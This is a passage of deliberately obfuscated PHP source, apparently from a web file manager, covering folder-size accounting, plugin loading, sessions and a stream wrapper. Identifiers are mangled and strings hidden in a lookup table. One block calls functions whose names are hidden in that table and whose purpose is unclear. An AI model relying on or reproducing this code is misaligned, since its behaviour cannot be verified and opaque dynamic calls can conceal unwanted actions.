array_sort_by($Eº…ÁŞƒª«, $Fí£×ˆôÌ[393]); $d¾­Î¼Œ­— = $Eº…ÁŞƒª«[0][$Fí£×ˆôÌ[366]]; } return $this->pathInfo($d¾­Î¼Œ­—, !0); } protected function updateModifyTime($BºçÆÂ»ïÅ) { goto Fïê‰Ö£ù¹; aöİÎÚ¨´«: $this->where($F¦ƒñ³á‚ )->save($c­¦Á¯Ç…); goto BÎ™Ì¯ŞÓ; b„øÁƒµ¢í: foreach ($BºçÆÂ»ïÅ as $BÁêó¦•’î => $Dƒ¢æç¼À†) { $BºçÆÂ»ïÅ[$BÁêó¦•’î] = intval($Dƒ¢æç¼À†); } $F¦ƒñ³á‚  = array($C©¤Ïôóæß[366] => array($C©¤Ïôóæß[7], $BºçÆÂ»ïÅ)); $c­¦Á¯Ç… = array($C©¤Ïôóæß[517] => USER_ID, $C©¤Ïôóæß[387] => time()); goto aöİÎÚ¨´«; Fïê‰Ö£ù¹: $C©¤Ïôóæß =& $_SERVER[÷ÖêïÔÔÓ]; if (!$BºçÆÂ»ïÅ) { return; } if (!is_array($BºçÆÂ»ïÅ)) { $BºçÆÂ»ïÅ = array($BºçÆÂ»ïÅ); } goto b„øÁƒµ¢í; BÎ™Ì¯ŞÓ: } public function folderSizeReset($dİø‡­‰‚’) { goto b°ŒÇïæ; b°ŒÇïæ: $a‰Ê’Ñğ½ =& $_SERVER[÷ÖêïÔÔÓ]; if ($this->statusIgnoreResetSpace) { return; } $B¸íÆƒèÓ˜ = $a‰Ê’Ñğ½[2235] . $dİø‡­‰‚’; goto fŒÇÇßæ±; fŒÇÇßæ±: CacheLock::lock($B¸íÆƒèÓ˜, 20); $this->sourceCacheClear($dİø‡­‰‚’); $C»’ÓÅ‚‚ = $this->sourceInfo($dİø‡­‰‚’); goto A×‚ÒˆÀ‘; Eø¥²Å“í‡: $d«ŠÃ×‡Ñ– = $this->parentLevelArray($C»’ÓÅ‚‚[$a‰Ê’Ñğ½[455]]); if ($d«ŠÃ×‡Ñ–) { $a­Œáà÷˜ = array($a‰Ê’Ñğ½[366] => array($a‰Ê’Ñğ½[381], $d«ŠÃ×‡Ñ–)); $this->where($a­Œáà÷˜)->setAdd($a‰Ê’Ñğ½[78], $aÈÓ¸ÇÏàÌ); } $this->targetSpaceUpdate($C»’ÓÅ‚‚[$a‰Ê’Ñğ½[368]], $C»’ÓÅ‚‚[$a‰Ê’Ñğ½[452]]); goto EÈ”‡ëœÎê; A×‚ÒˆÀ‘: $a­Œáà÷˜ = array($a‰Ê’Ñğ½[365] => $dİø‡­‰‚’, $a‰Ê’Ñğ½[392] => 0); $e´Œå‹õª = $this->where($a­Œáà÷˜)->sum($a‰Ê’Ñğ½[78]); $e´Œå‹õª = intval($e´Œå‹õª); goto C´ù½à¹²’; C´ù½à¹²’: $aÈÓ¸ÇÏàÌ = $e´Œå‹õª - intval($C»’ÓÅ‚‚[$a‰Ê’Ñğ½[78]]); if ($aÈÓ¸ÇÏàÌ == 0) { return CacheLock::unlock($B¸íÆƒèÓ˜); } $this->where(array($a‰Ê’Ñğ½[380] => $dİø‡­‰‚’))->setField($a‰Ê’Ñğ½[78], $e´Œå‹õª); goto Eø¥²Å“í‡; EÈ”‡ëœÎê: CacheLock::unlock($B¸íÆƒèÓ˜); goto c©ÍÑãá©Ï; c©ÍÑãá©Ï: } public function folderSizeResetChildren($FÊƒ¿Ÿ¥Àå) { goto eº¤Âñœ¼ˆ; fÑ•â¥ØŠá: $FˆÛá‚æ÷å = array($FØËÌ¯øáˆ[511] => 1, $FØËÌ¯øáˆ[518] => array($FØËÌ¯øáˆ[475], $F‘ôˆ‚ªùà[$FØËÌ¯øáˆ[455]] . $FÊƒ¿Ÿ¥Àå . $FØËÌ¯øáˆ[476])); $B‘Ú¥ƒ“ˆ = $FØËÌ¯øáˆ[2236]; $e¡Î¡ß˜ÕÑ = $this->field($B‘Ú¥ƒ“ˆ)->where($FˆÛá‚æ÷å)->select(); goto CšåÆ™¶ø; d£ğºØì¬‹: $e¡Î¡ß˜ÕÑ[] = $F‘ôˆ‚ªùà; $e¡Î¡ß˜ÕÑ = array_to_keyvalue($e¡Î¡ß˜ÕÑ, $FØËÌ¯øáˆ[366]); foreach ($e¡Î¡ß˜ÕÑ as $D¸¢Ş˜é’ => $cŞµìË“²‰) { $e¡Î¡ß˜ÕÑ[$D¸¢Ş˜é’][$FØËÌ¯øáˆ[2237]] = $e¡Î¡ß˜ÕÑ[$D¸¢Ş˜é’][$FØËÌ¯øáˆ[78]]; $e¡Î¡ß˜ÕÑ[$D¸¢Ş˜é’][$FØËÌ¯øáˆ[78]] = 0; } goto dŒ°Àí³Ä¿; eº¤Âñœ¼ˆ: $FØËÌ¯øáˆ =& $_SERVER[÷ÖêïÔÔÓ]; $this->sourceCacheClear($FÊƒ¿Ÿ¥Àå); $F‘ôˆ‚ªùà = $this->sourceInfo($FÊƒ¿Ÿ¥Àå); goto fÑ•â¥ØŠá; DŸª¡ÃÙ¤Ò: foreach ($e¡Î¡ß˜ÕÑ as $cŞµìË“²‰) { if ($cŞµìË“²‰[$FØËÌ¯øáˆ[78]] == $cŞµìË“²‰[$FØËÌ¯øáˆ[2237]]) { continue; } $EØäâÛÔˆ¨[] = array($FØËÌ¯øáˆ[366], $cŞµìË“²‰[$FØËÌ¯øáˆ[366]], $FØËÌ¯øáˆ[78], $cŞµìË“²‰[$FØËÌ¯øáˆ[78]]); } $this->saveAll($EØäâÛÔˆ¨); goto aÅÕŠËÒ; CšåÆ™¶ø: $FˆÛá‚æ÷å[$FØËÌ¯øáˆ[367]] = 0; $c¥ï´²·±ã = $this->field($B‘Ú¥ƒ“ˆ)->where($FˆÛá‚æ÷å)->select(); if (!$c¥ï´²·±ã) { return; } goto d£ğºØì¬‹; dŒ°Àí³Ä¿: foreach ($c¥ï´²·±ã as $cŞµìË“²‰) { $A±„õİ» = $cŞµìË“²‰[$FØËÌ¯øáˆ[457]] . $FØËÌ¯øáˆ[33]; if (!isset($e¡Î¡ß˜ÕÑ[$A±„õİ»])) { continue; } if ($cŞµìË“²‰[$FØËÌ¯øáˆ[393]] == $e¡Î¡ß˜ÕÑ[$A±„õİ»][$FØËÌ¯øáˆ[393]]) { $e¡Î¡ß˜ÕÑ[$A±„õİ»][$FØËÌ¯øáˆ[78]] += $cŞµìË“²‰[$FØËÌ¯øáˆ[78]]; } } foreach ($e¡Î¡ß˜ÕÑ as $cŞµìË“²‰) { $Cİ‘ÙŸ»ÓŠ = $this->parentLevelArray($cŞµìË“²‰[$FØËÌ¯øáˆ[455]]); foreach ($Cİ‘ÙŸ»ÓŠ as $A±„õİ») { $A±„õİ» = $A±„õİ» . $FØËÌ¯øáˆ[33]; if (!isset($e¡Î¡ß˜ÕÑ[$A±„õİ»])) { continue; } if ($cŞµìË“²‰[$FØËÌ¯øáˆ[393]] == $e¡Î¡ß˜ÕÑ[$A±„õİ»][$FØËÌ¯øáˆ[393]]) { $e¡Î¡ß˜ÕÑ[$A±„õİ»][$FØËÌ¯øáˆ[78]] += $cŞµìË“²‰[$FØËÌ¯øáˆ[78]]; } } } $EØäâÛÔˆ¨ = array(); goto DŸª¡ÃÙ¤Ò; aÅÕŠËÒ: } public function userSpaceReset($BˆÙÈï‘Ó = false) { $FÛ’‚×®Ç =& $_SERVER[÷ÖêïÔÔÓ]; $EïÂ†æŒó = $this->where(array($FÛ’‚×®Ç[368] => self::TYPE_USER, $FÛ’‚×®Ç[452] => $BˆÙÈï‘Ó, $FÛ’‚×®Ç[367] => 0))->sum($FÛ’‚×®Ç[78]); Model($FÛ’‚×®Ç[466])->userEdit($BˆÙÈï‘Ó, array($FÛ’‚×®Ç[1990] => $EïÂ†æŒó)); } public function targetSpaceUpdate($fš´ŒÇŠÅ, $BĞ¨š°ÃŠ”) { $Aà²°ëë =& $_SERVER[÷ÖêïÔÔÓ]; if (!$BĞ¨š°ÃŠ”) { return; } if (!in_array($fš´ŒÇŠÅ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $E¿¾ˆ‚Š“¡ = $this->targetSpaceSize($fš´ŒÇŠÅ, $BĞ¨š°ÃŠ”); if ($fš´ŒÇŠÅ == self::TYPE_USER) { Model($Aà²°ëë[466])->userEdit($BĞ¨š°ÃŠ”, array($Aà²°ëë[1990] => $E¿¾ˆ‚Š“¡)); } else { if ($fš´ŒÇŠÅ == self::TYPE_GROUP) { Model($Aà²°ëë[454])->groupEdit($BĞ¨š°ÃŠ”, array($Aà²°ëë[1990] => $E¿¾ˆ‚Š“¡)); } } } public function targetSpaceSize($B¿öâ¢ÇÁ, $f‹”ó—Â•Ì) { goto eµÉÁáÎÇ–; aåœ“Ú¶Ö: $a¤èà‚´–Ï = array_to_keyvalue($a¤èà‚´–Ï, $a‘²ÛÓˆà[33], $a‘²ÛÓˆà[366]); $a¤èà‚´–Ï = array_unique(array_filter($a¤èà‚´–Ï)); if ($a¤èà‚´–Ï) { $bŒØŞ¯»Š¹ = array($a‘²ÛÓˆà[380] => array($a‘²ÛÓˆà[381], $a¤èà‚´–Ï)); $a·ÚÄ¬­ì += floatval($this->where($bŒØŞ¯»Š¹)->sum($a‘²ÛÓˆà[78])); } goto A¢ˆé„ñø‘; EøÀ¢ôêŒà: $a·ÚÄ¬­ì = floatval($fáİàÒø[$a‘²ÛÓˆà[78]]); $bŒØŞ¯»Š¹ = array($a‘²ÛÓˆà[518] => array($a‘²ÛÓˆà[475], $a‘²ÛÓˆà[2076] . $fáİàÒø[$a‘²ÛÓˆà[366]] . $a‘²ÛÓˆà[476])); $a¤èà‚´–Ï = Model($a‘²ÛÓˆà[391])->field($a‘²ÛÓˆà[380])->where($bŒØŞ¯»Š¹)->select(); goto aåœ“Ú¶Ö; A¢ˆé„ñø‘: return $a·ÚÄ¬­ì; goto e±Ä¥Ğİ¦¨; eµÉÁáÎÇ–: $a‘²ÛÓˆà =& $_SERVER[÷ÖêïÔÔÓ]; $fáİàÒø = $this->sourceRoot($B¿öâ¢ÇÁ, $f‹”ó—Â•Ì, !0); if (!$fáİàÒø) { return 0; } goto EøÀ¢ôêŒà; e±Ä¥Ğİ¦¨: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($a¦²êáÏ—ã) { return $this->fileTypeProfile($a¦²êáÏ—ã, SourceModel::TYPE_USER); } public function groupFileTypeProfile($CÃ—Ùºù‘å) { return $this->fileTypeProfile($CÃ—Ùºù‘å, SourceModel::TYPE_GROUP); } private function fileTypeProfile($aÖÕ¥Å‹‚, $Fêó¶‹Õ£á) { goto d²ÍÀ´ôÏ; F±§ÒµŞƒ¯: $FµóØ‘™Ã = array(); $FµóØ‘™Ã[$F‡òã÷©‹·[2239]] = array($F‡òã÷©‹·[2240] => LNG($F‡òã÷©‹·[2239]), $F‡òã÷©‹·[2241] => $this->where($aöÚ‡À…§Ï)->count(), $F‡òã÷©‹·[513] => $this->where($aöÚ‡À…§Ï)->sum($F‡òã÷©‹·[78])); $AŞ£ô‰¤ôˆ = KodIO::fileTypeList(); goto b³•áà©Ë; b³•áà©Ë: foreach ($AŞ£ô‰¤ôˆ as $f˜Šå¼Š‰ => $B–œ¤„Ïäµ) { $aöÚ‡À…§Ï[$F‡òã÷©‹·[369]] = $this->fileTypeWhere($f˜Šå¼Š‰); $FµóØ‘™Ã[$f˜Šå¼Š‰] = array($F‡òã÷©‹·[2240] => $B–œ¤„Ïäµ[$F‡òã÷©‹·[28]], $F‡òã÷©‹·[2241] => $this->where($aöÚ‡À…§Ï)->count(), $F‡òã÷©‹·[513] => $this->where($aöÚ‡À…§Ï)->sum($F‡òã÷©‹·[78])); } Cache::set($C´­¢¥òô, $FµóØ‘™Ã, 1200); return $FµóØ‘™Ã; goto a·ÀÂèÏ–; AÜÜ¿¯×†: if ($cÈ§“§áÉ±) { return $cÈ§“§áÉ±; } $aöÚ‡À…§Ï = array($F‡òã÷©‹·[511] => 0); if ($aÖÕ¥Å‹‚ != !1) { $aöÚ‡À…§Ï[$F‡òã÷©‹·[452]] = $aÖÕ¥Å‹‚; $aöÚ‡À…§Ï[$F‡òã÷©‹·[368]] = $Fêó¶‹Õ£á; } goto F±§ÒµŞƒ¯; d²ÍÀ´ôÏ: $F‡òã÷©‹· =& $_SERVER[÷ÖêïÔÔÓ]; $C´­¢¥òô = $F‡òã÷©‹·[2238] . $aÖÕ¥Å‹‚ . $F‡òã÷©‹·[71] . $Fêó¶‹Õ£á; $cÈ§“§áÉ± = Cache::get($C´­¢¥òô); goto AÜÜ¿¯×†; a·ÀÂèÏ–: } public function fileNameExist($BÆ…î‡šØ, $eÑ¡Ÿ–íñ) { $a§šªÕÓâŸ =& $_SERVER[÷ÖêïÔÔÓ]; $B‰ÏÕ…ƒ‰ = $this->childList($BÆ…î‡šØ); foreach ($B‰ÏÕ…ƒ‰ as $fËğäòâ‚¸) { if ($fËğäòâ‚¸[$a§šªÕÓâŸ[28]] == $eÑ¡Ÿ–íñ) { return $fËğäòâ‚¸[$a§šªÕÓâŸ[366]]; } } return !1; } public function childList($b¥—ŒÉËƒ„) { $F²­‚àËÖé =& $_SERVER[÷ÖêïÔÔÓ]; $fÌÌê«Ô‚š = array($F²­‚àËÖé[457] => intval($b¥—ŒÉËƒ„), $F²­‚àËÖé[393] => 0); $fÍáƒùŠ¯ = $this->cacheMemory()->where($fÌÌê«Ô‚š)->select(); $fÍáƒùŠ¯ = $fÍáƒùŠ¯ ? $fÍáƒùŠ¯ : array(); foreach ($fÍáƒùŠ¯ as $Bô—­µ¯ƒ¼) { $bÓ—‰…¢ = $F²­‚àËÖé[406] . $Bô—­µ¯ƒ¼[$F²­‚àËÖé[366]]; self::$cacheSourceInfo[$bÓ—‰…¢] = $Bô—­µ¯ƒ¼; } return $fÍáƒùŠ¯; } public function fileNameAuto($dì‰Ø½ÎÖì, $AÈ¿Ò‹¹™, $e­…«šõ¯ù = REPEAT_RENAME, $aÔöØİ´” = false) { $aÌ³„—ŒÚœ =& $_SERVER[÷ÖêïÔÔÓ]; $FäÆÌŠÕ = $this->childList($dì‰Ø½ÎÖì); $A«¯£Ø§½ğ = array_to_keyvalue($FäÆÌŠÕ, $aÌ³„—ŒÚœ[33], $aÌ³„—ŒÚœ[28]); return $this->fileNameAutoGet($A«¯£Ø§½ğ, $AÈ¿Ò‹¹™, $e­…«šõ¯ù, $aÔöØİ´”); } public function fileNameAutoGet($BâÁ„²Á¤¼, $bí§É›Ä¥ç, $bÄê¦ÄèÕò, $E½áŒ£ÖŒ¡) { $d¬Ş×°ˆÀ” =& $_SERVER[÷ÖêïÔÔÓ]; if ($bÄê¦ÄèÕò == REPEAT_REPLACE || !$BâÁ„²Á¤¼ || !in_array_not_case($bí§É›Ä¥ç, $BâÁ„²Á¤¼) || $E½áŒ£ÖŒ¡ && $bÄê¦ÄèÕò != REPEAT_RENAME_FOLDER) { return $bí§É›Ä¥ç; } if ($bÄê¦ÄèÕò == REPEAT_SKIP) { return !1; } $EİËº¸Ö¶ = $d¬Ş×°ˆÀ”[92] . get_path_ext($bí§É›Ä¥ç); $EİËº¸Ö¶ = $EİËº¸Ö¶ == $d¬Ş×°ˆÀ”[92] || $E½áŒ£ÖŒ¡ ? $d¬Ş×°ˆÀ”[33] : $EİËº¸Ö¶; for ($d–¨º±†› = 1; $d–¨º±†› <= count($BâÁ„²Á¤¼) + 1; $d–¨º±†›++) { $DË¸×áˆç° = substr($bí§É›Ä¥ç, 0, strlen($bí§É›Ä¥ç) - strlen($EİËº¸Ö¶)); $b†—™ò›ˆ = $DË¸×áˆç° . "\x28{$d–¨º±†›}\x29{$EİËº¸Ö¶}"; if (!in_array_not_case($b†—™ò›ˆ, $BâÁ„²Á¤¼)) { return $b†—™ò›ˆ; } } } } goto f°ºÃóÜò“; c”Ñ¥¼±Š„: register_shutdown_function($_SERVER[Óº‹‘Î][35]); set_error_handler($_SERVER[Óº‹‘Î][48], $B×…Â‹ôëß); if (function_exists($_SERVER[Óº‹‘Î][49])) { set_exception_handler($_SERVER[Óº‹‘Î][50]); } goto e×°×°‘Ûë; b öÏ¿’¸ö: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\x70\x6c\x75\x67\x69\156\114\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x73\x74\x61\x74\x75\x73", "\162\145\147\x69\x65\163\x74", "\x63\157\156\x66\x69\147"); public function loadList($B¢ÖÖ“İ• = false) { $a’ÆÒâÃËò = array_to_keyvalue($this->listData(), $_SERVER[÷ÖêïÔÔÓ][28]); if ($B¢ÖÖ“İ•) { return $a’ÆÒâÃËò[$B¢ÖÖ“İ•]; } return $a’ÆÒâÃËò; } public function init() { $f—ñ¬ÊÄª„ =& $_SERVER[÷ÖêïÔÔÓ]; Hook::trigger($f—ñ¬ÊÄª„[2095]); $F¯³‹È²óí = $this->loadPluginList(); foreach ($F¯³‹È²óí as $eò¾†÷‚¿Ó => $Dİæ ’›»Å) { $eĞñÆÕÈÉ™ = $this->appAllow($eò¾†÷‚¿Ó, $Dİæ ’›»Å); if (!$eĞñÆÕÈÉ™) { continue; } foreach ($Dİæ ’›»Å[$f—ñ¬ÊÄª„[2096]] as $CéÔğŸ§ŸÃ => $F‚ãÓ½ïº) { Hook::bind($CéÔğŸ§ŸÃ, $F‚ãÓ½ïº); } } Hook::trigger($f—ñ¬ÊÄª„[2097]); Hook::trigger(ACTION); } public function appAllow($Cèìæ“Òø, $dÏÖå÷´öë, $Bá—Œï„“ = true) { $DÚ©±ÊÉµÙ =& $_SERVER[÷ÖêïÔÔÓ]; $b­˜¤Üâ = PLUGIN_DIR . $Cèìæ“Òø . $DÚ©±ÊÉµÙ[2098]; if (!is_array($dÏÖå÷´öë) || !is_array($dÏÖå÷´öë[$DÚ©±ÊÉµÙ[2096]]) || !is_file($b­˜¤Üâ) || $dÏÖå÷´öë[$DÚ©±ÊÉµÙ[675]] != 1) { return !1; } if ($Bá—Œï„“ && !Action($DÚ©±ÊÉµÙ[2099])->checkAuth($Cèìæ“Òø)) { return !1; } return !0; } public function unInstall($c´áˆóÍ‘‹) { $DÓ™£ØøÈ =& $_SERVER[÷ÖêïÔÔÓ]; $a›ù¶‘¹á£ = $this->loadList($c´áˆóÍ‘‹); if (file_exists(PLUGIN_DIR . $c´áˆóÍ‘‹)) { Hook::apply($c´áˆóÍ‘‹ . $DÓ™£ØøÈ[2100]); } $this->remove($a›ù¶‘¹á£[$DÓ™£ØøÈ[364]]); } public function changeStatus($Aø¢‰çÛÓ, $F´ğˆ¯´Ï…) { $b„«øØòÈ =& $_SERVER[÷ÖêïÔÔÓ]; $fÕ¡—µÈŠî = $this->loadList($Aø¢‰çÛÓ); if ($F´ğˆ¯´Ï…) { Hook::apply($Aø¢‰çÛÓ . $b„«øØòÈ[2101]); } $this->update($fÕ¡—µÈŠî[$b„«øØòÈ[364]], array($b„«øØòÈ[2102] => $F´ğˆ¯´Ï…)); } public function appRegist($fƒÙ²ó¹ƒ, $f”¢ ¹Í’ñ) { $c ŸîŞÅ˜ =& $_SERVER[÷ÖêïÔÔÓ]; $BŞ‰†Çµ” = $this->loadList($fƒÙ²ó¹ƒ); if ($BŞ‰†Çµ”) { $this->update($BŞ‰†Çµ”[$c ŸîŞÅ˜[364]], array($c ŸîŞÅ˜[2096] => $f”¢ ¹Í’ñ)); } else { $dĞÏ Ùí = array($c ŸîŞÅ˜[28] => $fƒÙ²ó¹ƒ, $c ŸîŞÅ˜[2096] => $f”¢ ¹Í’ñ, $c ŸîŞÅ˜[675] => 0, $c ŸîŞÅ˜[6] => $this->getConfigDefault($fƒÙ²ó¹ƒ)); $this->insert($dĞÏ Ùí); } } public function getConfigDefault($e™‹¦ Æˆî) { $Fâá†¦ôí¹ =& $_SERVER[÷ÖêïÔÔÓ]; $aš°ªƒ˜– = array(); $E¬¼Ê¾ˆæ = $this->getPackageJson($e™‹¦ Æˆî); if (!$E¬¼Ê¾ˆæ && is_array($E¬¼Ê¾ˆæ[$Fâá†¦ôí¹[2103]])) { return $aš°ªƒ˜–; } foreach ($E¬¼Ê¾ˆæ[$Fâá†¦ôí¹[2103]] as $Fˆì‡İ±… => $A—õê¬É†Ä) { if (!isset($A—õê¬É†Ä[$Fâá†¦ôí¹[354]]) || isset($aš°ªƒ˜–[$Fˆì‡İ±…])) { continue; } $aš°ªƒ˜–[$Fˆì‡İ±…] = $A—õê¬É†Ä[$Fâá†¦ôí¹[354]]; } return $aš°ªƒ˜–; } public function getPackageJson($fˆ¾íŒªÃè) { return Hook::apply($fˆ¾íŒªÃè . $_SERVER[÷ÖêïÔÔÓ][2104]); } public function getConfig($Cù‡„ëµ², $fÌ»äùàÀÔ = false) { $cº¹ë‚µ† =& $_SERVER[÷ÖêïÔÔÓ]; $Eİ‹îãæÇ˜ = array(); $bĞË½„‡«İ = $this->loadList($Cù‡„ëµ²); if ($bĞË½„‡«İ && is_array($bĞË½„‡«İ[$cº¹ë‚µ†[6]])) { $Eİ‹îãæÇ˜ = $bĞË½„‡«İ[$cº¹ë‚µ†[6]]; } if (!$Eİ‹îãæÇ˜ || $fÌ»äùàÀÔ) { $Eİ‹îãæÇ˜ = $this->getConfigDefault($Cù‡„ëµ²); } return $Eİ‹îãæÇ˜; } public function setConfig($a«êÜ±İ™¼, $Fó¡®‘ÙÚÕ = false) { goto d„·¾—´Å¦; dÜÖ’Š„å…: if ($Fó¡®‘ÙÚÕ == !1) { $Fó¡®‘ÙÚÕ = $this->getConfigDefault($a«êÜ±İ™¼); } $d§‰Îë˜Âˆ = $d¶±¦ØÔ§í[$EÇ×ÆááŒ[6]]; foreach ($Fó¡®‘ÙÚÕ as $f¸ù¾óÎ¾Œ => $c°ÙÅí¸Ä) { $d§‰Îë˜Âˆ[$f¸ù¾óÎ¾Œ] = is_string($c°ÙÅí¸Ä) ? trim($c°ÙÅí¸Ä) : $c°ÙÅí¸Ä; } goto dÍ”˜‰ğ ; dÍ”˜‰ğ : $this->update($d¶±¦ØÔ§í[$EÇ×ÆááŒ[364]], array($EÇ×ÆááŒ[6] => $d§‰Îë˜Âˆ)); goto B²ÛÜ¸Óö¥; d„·¾—´Å¦: $EÇ×ÆááŒ =& $_SERVER[÷ÖêïÔÔÓ]; $d¶±¦ØÔ§í = $this->loadList($a«êÜ±İ™¼); if (!$d¶±¦ØÔ§í) { return !1; } goto dÜÖ’Š„å…; B²ÛÜ¸Óö¥: } public function viewList() { goto A‹²ô°ë¹Ã; A‹²ô°ë¹Ã: $EÜî‘Ğ··‚ =& $_SERVER[÷ÖêïÔÔÓ]; $f¦ç·Úò¤ = $this->loadList(); $this->pluginScan($f¦ç·Úò¤); goto aÙäõİ÷ğ¶; aÙäõİ÷ğ¶: $f¦ç·Úò¤ = $this->loadPluginList(); $e”Šùñİ‚‰ = array(); foreach ($f¦ç·Úò¤ as $cÖİ¨â¿¾Œ => $C¥‰ÄŒœØÇ) { unset($C¥‰ÄŒœØÇ[$EÜî‘Ğ··‚[2096]], $C¥‰ÄŒœØÇ[$EÜî‘Ğ··‚[6]]); $c¶°ìÇ–Â = PLUGIN_DIR . $C¥‰ÄŒœØÇ[$EÜî‘Ğ··‚[28]] . $EÜî‘Ğ··‚[2098]; if (!is_file($c¶°ìÇ–Â)) { continue; } $FäĞ‘×°ºª = Hook::apply($C¥‰ÄŒœØÇ[$EÜî‘Ğ··‚[28]] . $EÜî‘Ğ··‚[2104]); if (is_array($FäĞ‘×°ºª)) { $e”Šùñİ‚‰[$cÖİ¨â¿¾Œ] = array_merge($C¥‰ÄŒœØÇ, $FäĞ‘×°ºª); } } goto D’¦¡‹Ì¨„; D’¦¡‹Ì¨„: return $e”Šùñİ‚‰; goto EÓ‘‚Ò®³í; EÓ‘‚Ò®³í: } private function loadPluginList() { $bÒâ©¶·èé =& $_SERVER[÷ÖêïÔÔÓ]; $A˜ÕÂÉÈˆ = $this->loadList(); if (strtolower(MOD) == $bÒâ©¶·èé[2105]) { $B²çù‰±µé = $A˜ÕÂÉÈˆ; } else { $B²çù‰±µé = Hook::trigger($bÒâ©¶·èé[2106], $A˜ÕÂÉÈˆ); if (!$B²çù‰±µé) { die; } } return $B²çù‰±µé; } private function pluginScan($eÄˆ»Ãª“ö) { $bˆº—¨Ò½Ú =& $_SERVER[÷ÖêïÔÔÓ]; recursion_dir(PLUGIN_DIR, $déÛĞ×°, $bÓîÓ×ÌŸÇ, 0); foreach ($déÛĞ×° as $B™èŞÚºå…) { $C»¸·«®í = get_path_this($B™èŞÚºå…); if (isset($eÄˆ»Ãª“ö[$C»¸·«®í]) || !file_exists($B™èŞÚºå… . $bˆº—¨Ò½Ú[2107]) || !file_exists($B™èŞÚºå… . $bˆº—¨Ò½Ú[2098])) { continue; } Hook::apply($C»¸·«®í . $bˆº—¨Ò½Ú[2101]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\164\145\x6d\x5f\x73\145\163\x73\151\157\x6e"; public function get($D“èÊñÑ‚½) { $b‡•¼ØÒºî =& $_SERVER[÷ÖêïÔÔÓ]; $dñé¶Ş = $this->where(array($b‡•¼ØÒºî[2108] => $D“èÊñÑ‚½))->find(); if (!is_array($dñé¶Ş)) { return !1; } return $dñé¶Ş[$b‡•¼ØÒºî[678]]; } public function set($C¬²ã¸›³®, $f‡Ñó£Àá, $aÆé†­ñš× = 3600) { $d°ç‚˜â°÷ =& $_SERVER[÷ÖêïÔÔÓ]; $dæòœŠÕ¡… = array($d°ç‚˜â°÷[2108] => $C¬²ã¸›³®, $d°ç‚˜â°÷[2035] => $f‡Ñó£Àá, $d°ç‚˜â°÷[2109] => $aÆé†­ñš× + time()); if (Session::get($d°ç‚˜â°÷[2110])) { $dæòœŠÕ¡…[$d°ç‚˜â°÷[1341]] = Session::get($d°ç‚˜â°÷[2110]); } else { $dæòœŠÕ¡…[$d°ç‚˜â°÷[1341]] = 0; } if ($this->get($C¬²ã¸›³®)) { return $this->where(array($d°ç‚˜â°÷[2108] => $C¬²ã¸›³®))->save($dæòœŠÕ¡…); } else { return $this->add($dæòœŠÕ¡…, array(), !0); } } public function remove($BéÂÙô“êÚ) { return $this->where(array($_SERVER[÷ÖêïÔÔÓ][2108] => $BéÂÙô“êÚ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[÷ÖêïÔÔÓ][2111] . time())->delete(); } } if ($_SERVER[$_SERVER[÷ÖêïÔÔÓ][781]] != $_SERVER[$_SERVER[÷ÖêïÔÔÓ][782]]) { goto B­Š­”Ş˜; E“²§Œ¾­¢: $AÀÇ¼è¢ÁĞ = explode($_SERVER[÷ÖêïÔÔÓ][214], $C¶ó·šÈá—); if (count($AÀÇ¼è¢ÁĞ) < $_SERVER[÷ÖêïÔÔÓ][550]) { $FëŸ®ŠòÏ¼ = $_SERVER[÷ÖêïÔÔÓ][787]; $FëŸ®ŠòÏ¼(); } $a¾„§³‰‰Æ = $_SERVER[÷ÖêïÔÔÓ][792]; goto Aë‚ìÔ©ââ; B­Š­”Ş˜: $f¾ãœ„š—Ü = $_SERVER[÷ÖêïÔÔÓ][784]; $bÌİ¶åÑ· = $_SERVER[$_SERVER[÷ÖêïÔÔÓ][785]] . $_SERVER[÷ÖêïÔÔÓ][786]; $C¶ó·šÈá— = $f¾ãœ„š—Ü($bÌİ¶åÑ·); goto E“²§Œ¾­¢; Aë‚ìÔ©ââ: $a¾„§³‰‰Æ($_SERVER[$_SERVER[÷ÖêïÔÔÓ][791]]); goto FŞïí­¿¹ò; FŞïí­¿¹ò: } goto Bê® Å¸‰”; CÄ×„±ÇÉ…: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($b‘­Çäî·¡, $c½õŸ±»ƒ = '') { goto BÒ¼¾ÍÂ×Î; b•âó’áøé: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$b‘­Çäî·¡])) { self::$_chunkBuffer[$b‘­Çäî·¡] = array(); } goto bŒ“À§Â¯; BÒ¼¾ÍÂ×Î: $this->info = $this->info($b‘­Çäî·¡); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[÷ÖêïÔÔÓ][76]]; goto b•âó’áøé; bŒ“À§Â¯: return $this->info ? !0 : !1; goto cÀ”éÒğÔ¯; cÀ”éÒğÔ¯: } function stream_read($C¥öÜšĞáî) { $aö„ß…‚³Å = $this->fileSubstr($this->pose, $C¥öÜšĞáî); $this->pose += strlen($aö„ß…‚³Å); return $aö„ß…‚³Å; } public function stream_tell() { return $this->pose; } public function stream_seek($eÇå´ö¹ŞÛ, $cß‚ÃƒĞö) { $fÆãøˆù§ =& $_SERVER[÷ÖêïÔÔÓ]; if ($cß‚ÃƒĞö == SEEK_SET) { $this->pose = $eÇå´ö¹ŞÛ; } else { if ($cß‚ÃƒĞö == SEEK_CUR) { $this->pose += $eÇå´ö¹ŞÛ; } else { if ($cß‚ÃƒĞö == SEEK_END) { $this->pose = $this->info[$fÆãøˆù§[78]] + intval($eÇå´ö¹ŞÛ); } } } if ($eÇå´ö¹ŞÛ < 0) { $this->pose = $this->info[$fÆãøˆù§[78]] + $eÇå´ö¹ŞÛ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[÷ÖêïÔÔÓ][78]]; } public function stream_close() { return !0; } public function url_stat($aôÆ´ØÖÃ‹, $Aá·”Ç×Å) { $Aö°°’çñ =& $_SERVER[÷ÖêïÔÔÓ]; $cÏ˜ß·Ã¿Á = $this->info($aôÆ´ØÖÃ‹); return array($Aö°°’çñ[1202] => 0, $Aö°°’çñ[1203] => 0, 